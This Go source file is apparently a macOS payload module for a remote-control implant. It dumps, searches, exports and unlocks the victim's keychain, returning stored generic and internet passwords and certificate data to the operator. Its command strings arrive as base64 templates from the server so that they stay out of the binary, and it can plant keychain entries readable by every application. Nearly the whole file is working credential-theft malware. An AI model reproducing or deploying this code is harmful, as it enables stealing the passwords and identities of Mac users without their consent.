// server/docker/payloads/TCP_Darwin/action_keychain.go
//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

// KeychainTemplate receives string templates from server
type KeychainTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Keychain template indices (must match server's common.go)
const (
	// Actions
	idxKcList   = 610
	idxKcDump   = 611
	idxKcSearch = 612
	idxKcAdd    = 613
	idxKcDelete = 614
	idxKcExport = 615
	idxKcUnlock = 616

	// Flags (short form - server transforms long flags)
	idxKcFlagKeychain = 617
	idxKcFlagService  = 618
	idxKcFlagAccount  = 619
	idxKcFlagLabel    = 620
	idxKcFlagPassword = 621
	idxKcFlagOutput   = 622

	// Parsing strings
	idxKcPKeychain = 623
	idxKcPData     = 624
	idxKcPPassword = 625
	idxKcPAcct     = 626
	idxKcPSvce     = 627
	idxKcPDesc     = 628
	idxKcPLabl     = 629
	idxKcPSubj     = 630

	// Security tool and subcommands
	idxKcSecurity         = 631
	idxKcListKeychains    = 632
	idxKcDefaultKeychain  = 633
	idxKcDumpKeychain     = 634
	idxKcFindInternetPwd  = 635
	idxKcFindCertificate  = 636
	idxKcFindGenericPwd   = 637
	idxKcAddGenericPwd    = 638
	idxKcDeleteGenericPwd = 639
	idxKcSecExport        = 640
	idxKcUnlockKeychain   = 641

	// Path strings
	idxKcLibrary   = 642
	idxKcKeychains = 643
	idxKcKcStr     = 644

	// Export format strings
	idxKcIdentities = 645
	idxKcPkcs12     = 646

	// Map key strings
	idxKcMKeychain    = 647
	idxKcMAccount     = 648
	idxKcMService     = 649
	idxKcMDescription = 650
	idxKcMData        = 651
	idxKcMPassword    = 652
)

// KeychainCommand manages macOS keychain operations
type KeychainCommand struct {
	tpl *KeychainTemplate
}

// getTpl safely retrieves a template string by index
func (c *KeychainCommand) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		return c.tpl.Templates[idx]
	}
	return ""
}

func (c *KeychainCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data - required for operation
	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
	if err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	c.tpl = &KeychainTemplate{}
	if err := json.Unmarshal(decoded, c.tpl); err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	action := args[0]

	// Match action against template values
	switch action {
	case c.getTpl(idxKcList):
		return c.listKeychains()
	case c.getTpl(idxKcDump):
		return c.dumpKeychain(args[1:])
	case c.getTpl(idxKcSearch):
		return c.searchKeychain(args[1:])
	case c.getTpl(idxKcAdd):
		return c.addToKeychain(args[1:])
	case c.getTpl(idxKcDelete):
		return c.deleteFromKeychain(args[1:])
	case c.getTpl(idxKcExport):
		return c.exportKeychain(args[1:])
	case c.getTpl(idxKcUnlock):
		return c.unlockKeychain(args[1:])
	default:
		return CommandResult{
			Output:      ErrCtx(E21, action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// listKeychains lists all available keychains
func (c *KeychainCommand) listKeychains() CommandResult {
	var output strings.Builder

	security := c.getTpl(idxKcSecurity)
	listKeychains := c.getTpl(idxKcListKeychains)
	defaultKeychain := c.getTpl(idxKcDefaultKeychain)
	library := c.getTpl(idxKcLibrary)
	keychains := c.getTpl(idxKcKeychains)
	kcStr := c.getTpl(idxKcKcStr)

	// List default keychains
	cmd := exec.Command(security, listKeychains)
	if result, err := cmd.Output(); err == nil {
		lines := strings.Split(string(result), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			line = strings.Trim(line, "\"")
			if line != "" {
				// Check if readable
				if _, err := os.Stat(line); err == nil {
					output.WriteString(fmt.Sprintf("%s (+)\n", line))
				} else {
					output.WriteString(fmt.Sprintf("%s (-)\n", line))
				}
			}
		}
	}

	// List login keychain
	cmd = exec.Command(security, defaultKeychain)
	if result, err := cmd.Output(); err == nil {
		defaultKc := strings.TrimSpace(string(result))
		defaultKc = strings.Trim(defaultKc, "\"")
		output.WriteString(fmt.Sprintf("D:%s\n", defaultKc))
	}

	// Check for additional keychains in user directory
	if u, err := user.Current(); err == nil {
		keychainDir := filepath.Join(u.HomeDir, library, keychains)
		if entries, err := os.ReadDir(keychainDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() && strings.Contains(entry.Name(), kcStr) {
					output.WriteString(fmt.Sprintf("U:%s\n", entry.Name()))
				}
			}
		}
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// dumpKeychain dumps keychain contents
func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
	keychainPath := ""
	flagKeychain := c.getTpl(idxKcFlagKeychain)

	// Parse arguments
	for i := 0; i < len(args); i++ {
		if args[i] == flagKeychain && i+1 < len(args) {
			keychainPath = args[i+1]
			i++
		}
	}

	var dumpOutput strings.Builder

	security := c.getTpl(idxKcSecurity)
	dumpKc := c.getTpl(idxKcDumpKeychain)
	findInternetPwd := c.getTpl(idxKcFindInternetPwd)
	findCert := c.getTpl(idxKcFindCertificate)

	// Parsing strings
	pKeychain := c.getTpl(idxKcPKeychain)
	pAcct := c.getTpl(idxKcPAcct)
	pSvce := c.getTpl(idxKcPSvce)
	pDesc := c.getTpl(idxKcPDesc)
	pData := c.getTpl(idxKcPData)
	pPassword := c.getTpl(idxKcPPassword)
	pLabl := c.getTpl(idxKcPLabl)
	pSubj := c.getTpl(idxKcPSubj)

	// Map keys
	mKeychain := c.getTpl(idxKcMKeychain)
	mAccount := c.getTpl(idxKcMAccount)
	mService := c.getTpl(idxKcMService)
	mDescription := c.getTpl(idxKcMDescription)
	mData := c.getTpl(idxKcMData)
	mPassword := c.getTpl(idxKcMPassword)

	// Dump generic passwords
	cmd := exec.Command(security, dumpKc, "-d")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		// Parse output for passwords
		lines := strings.Split(string(result), "\n")
		currentItem := make(map[string]string)

		for _, line := range lines {
			line = strings.TrimSpace(line)

			if strings.HasPrefix(line, pKeychain) {
				if len(currentItem) > 0 {
					dumpOutput.WriteString(c.formatKeychainItem(currentItem, mService, mAccount, mDescription, mPassword, mData))
					currentItem = make(map[string]string)
				}
				currentItem[mKeychain] = strings.TrimPrefix(line, pKeychain)
			} else if strings.Contains(line, pAcct) {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem[mAccount] = strings.Trim(parts[1], " \"")
				}
			} else if strings.Contains(line, pSvce) {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem[mService] = strings.Trim(parts[1], " \"")
				}
			} else if strings.Contains(line, pDesc) {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem[mDescription] = strings.Trim(parts[1], " \"")
				}
			} else if strings.HasPrefix(line, pData) {
				currentItem[mData] = strings.TrimPrefix(line, pData)
			} else if strings.HasPrefix(line, pPassword) {
				pwd := strings.TrimPrefix(line, pPassword)
				pwd = strings.Trim(pwd, " \"")
				currentItem[mPassword] = pwd
			}
		}

		// Output last item
		if len(currentItem) > 0 {
			dumpOutput.WriteString(c.formatKeychainItem(currentItem, mService, mAccount, mDescription, mPassword, mData))
		}
	} else {
		return CommandResult{
			Output:      ErrCtx(E3, stderr.String()),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Dump internet passwords
	cmd = exec.Command(security, findInternetPwd, "-g", "-a", "")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	stderr.Reset()
	cmd.Stderr = &stderr
	if _, err := cmd.Output(); err == nil {
		// Parse stderr for passwords (security outputs passwords to stderr)
		dumpOutput.Write(stderr.Bytes())
	}

	// List certificates
	cmd = exec.Command(security, findCert, "-a")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	if result, err := cmd.Output(); err == nil {
		lines := strings.Split(string(result), "\n")
		for _, line := range lines {
			if strings.Contains(line, pLabl) || strings.Contains(line, pSubj) {
				dumpOutput.WriteString(fmt.Sprintf("%s\n", strings.TrimSpace(line)))
			}
		}
	}

	return CommandResult{
		Output:      dumpOutput.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// formatKeychainItem formats a keychain item for display
func (c *KeychainCommand) formatKeychainItem(item map[string]string, mService, mAccount, mDescription, mPassword, mData string) string {
	var output strings.Builder
	output.WriteString("\n---\n")
	if service, ok := item[mService]; ok {
		output.WriteString(fmt.Sprintf("S:%s\n", service))
	}
	if account, ok := item[mAccount]; ok {
		output.WriteString(fmt.Sprintf("A:%s\n", account))
	}
	if desc, ok := item[mDescription]; ok {
		output.WriteString(fmt.Sprintf("D:%s\n", desc))
	}
	if password, ok := item[mPassword]; ok {
		output.WriteString(fmt.Sprintf("P:%s\n", password))
	}
	if data, ok := item[mData]; ok {
		// Try to decode hex data
		if decoded, err := base64.StdEncoding.DecodeString(data); err == nil {
			output.WriteString(fmt.Sprintf("V:%s\n", string(decoded)))
		} else {
			output.WriteString(fmt.Sprintf("V:%s\n", data))
		}
	}
	return output.String()
}

// searchKeychain searches for specific items
func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
	var service, account, label string

	flagService := c.getTpl(idxKcFlagService)
	flagAccount := c.getTpl(idxKcFlagAccount)
	flagLabel := c.getTpl(idxKcFlagLabel)

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case flagService:
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case flagAccount:
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		case flagLabel:
			if i+1 < len(args) {
				label = args[i+1]
				i++
			}
		}
	}

	var searchOutput strings.Builder

	security := c.getTpl(idxKcSecurity)
	findGenericPwd := c.getTpl(idxKcFindGenericPwd)
	findInternetPwd := c.getTpl(idxKcFindInternetPwd)

	// Search generic passwords
	cmd := exec.Command(security, findGenericPwd)
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}
	if label != "" {
		cmd.Args = append(cmd.Args, "-l", label)
	}
	cmd.Args = append(cmd.Args, "-g") // Show password

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		searchOutput.WriteString(Succ(S6) + "\n")
		searchOutput.Write(result)
		// Password is in stderr
		if stderr.Len() > 0 {
			searchOutput.Write(stderr.Bytes())
		}
	} else {
		searchOutput.WriteString(Err(E4) + "\n")
	}

	// Search internet passwords
	searchOutput.WriteString("\n")
	cmd = exec.Command(security, findInternetPwd)
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}
	if label != "" {
		cmd.Args = append(cmd.Args, "-l", label)
	}
	cmd.Args = append(cmd.Args, "-g")

	stderr.Reset()
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		searchOutput.WriteString(Succ(S6) + "\n")
		searchOutput.Write(result)
		if stderr.Len() > 0 {
			searchOutput.Write(stderr.Bytes())
		}
	} else {
		searchOutput.WriteString(Err(E4) + "\n")
	}

	return CommandResult{
		Output:      searchOutput.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// addToKeychain adds an item to the keychain
func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
	var service, account, password string

	flagService := c.getTpl(idxKcFlagService)
	flagAccount := c.getTpl(idxKcFlagAccount)
	flagPassword := c.getTpl(idxKcFlagPassword)

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case flagService:
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case flagAccount:
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		case flagPassword:
			if i+1 < len(args) {
				password = args[i+1]
				i++
			}
		}
	}

	if service == "" || account == "" || password == "" {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	security := c.getTpl(idxKcSecurity)
	addGenericPwd := c.getTpl(idxKcAddGenericPwd)

	// Add to keychain
	cmd := exec.Command(security, addGenericPwd,
		"-s", service,
		"-a", account,
		"-w", password,
		"-T", "") // Allow access by all applications

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:      Err(E11),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      SuccCtx(S1, fmt.Sprintf("%s:%s", service, account)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// deleteFromKeychain deletes an item from the keychain
func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
	var service, account string

	flagService := c.getTpl(idxKcFlagService)
	flagAccount := c.getTpl(idxKcFlagAccount)

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case flagService:
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case flagAccount:
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		}
	}

	if service == "" && account == "" {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	security := c.getTpl(idxKcSecurity)
	deleteGenericPwd := c.getTpl(idxKcDeleteGenericPwd)

	// Delete from keychain
	cmd := exec.Command(security, deleteGenericPwd)
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:      Err(E11),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      SuccCtx(S2, fmt.Sprintf("%s:%s", service, account)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// exportKeychain exports keychain to a file
func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
	var keychainPath, outputPath string

	flagKeychain := c.getTpl(idxKcFlagKeychain)
	flagOutput := c.getTpl(idxKcFlagOutput)

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case flagKeychain:
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		case flagOutput:
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		}
	}

	if outputPath == "" {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	security := c.getTpl(idxKcSecurity)
	secExport := c.getTpl(idxKcSecExport)
	dumpKc := c.getTpl(idxKcDumpKeychain)
	identities := c.getTpl(idxKcIdentities)
	pkcs12 := c.getTpl(idxKcPkcs12)

	// Use security command to export
	cmd := exec.Command(security, secExport)
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, "-k", keychainPath)
	}
	cmd.Args = append(cmd.Args, "-t", identities, "-f", pkcs12, "-o", outputPath)

	if _, err := cmd.CombinedOutput(); err != nil {
		// Try alternative export method - dump keychain to text file
		cmd = exec.Command(security, dumpKc, "-d")
		if keychainPath != "" {
			cmd.Args = append(cmd.Args, keychainPath)
		}

		if dumpOutputBytes, err := cmd.Output(); err == nil {
			if err := os.WriteFile(outputPath, dumpOutputBytes, 0600); err != nil {
				return CommandResult{
					Output:      ErrCtx(E11, outputPath),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			return CommandResult{
				Output:      SuccCtx(S1, outputPath),
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		} else {
			return CommandResult{
				Output:      ErrCtx(E11, outputPath),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
	}

	return CommandResult{
		Output:      SuccCtx(S1, outputPath),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// unlockKeychain unlocks a keychain
func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
	var keychainPath, password string

	flagKeychain := c.getTpl(idxKcFlagKeychain)
	flagPassword := c.getTpl(idxKcFlagPassword)

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case flagKeychain:
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		case flagPassword:
			if i+1 < len(args) {
				password = args[i+1]
				i++
			}
		}
	}

	if password == "" {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	security := c.getTpl(idxKcSecurity)
	unlockKc := c.getTpl(idxKcUnlockKeychain)

	// Unlock keychain
	cmd := exec.Command(security, unlockKc, "-p", password)
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:      Err(E3),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	var result string
	if keychainPath != "" {
		result = SuccCtx(S29, keychainPath) + "\n"
	} else {
		result = Succ(S29) + "\n"
	}

	return CommandResult{
		Output:      result,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
